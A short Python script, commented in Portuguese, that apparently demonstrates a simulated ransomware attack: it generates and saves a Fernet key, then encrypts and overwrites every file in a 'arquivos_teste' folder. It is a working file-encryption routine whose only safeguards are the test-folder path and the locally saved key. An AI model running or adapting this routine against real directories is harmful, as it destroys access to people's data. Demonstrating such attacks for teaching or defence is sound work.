import os
from cryptography.fernet import Fernet

# 1. Gerar a chave de criptografia
chave = Fernet.generate_key()
with open("chave.key", "wb") as key_file:
    key_file.write(chave)

# 2. Inicializar o software de cifragem com a chave
fernet = Fernet(chave)

# 3. Localizar os arquivos de teste
caminho_alvo = "arquivos_teste"
arquivos = [f for f in os.listdir(caminho_alvo) if os.path.isfile(os.path.join(caminho_alvo, f))]

print(f"Criptografando arquivos em: {caminho_alvo}...")

for nome_arquivo in arquivos:
    caminho_completo = os.path.join(caminho_alvo, nome_arquivo)
    
    # Ler o conteúdo original
    with open(caminho_completo, "rb") as arquivo:
        dados = arquivo.read()
    
    # Criptografar os dados
    dados_criptografados = fernet.encrypt(dados)
    
    # Sobrescrever o arquivo com os dados "sequestrados"
    with open(caminho_completo, "wb") as arquivo:
        arquivo.write(dados_criptografados)

print("Ataque simulado concluído. Todos os arquivos foram cifrados!")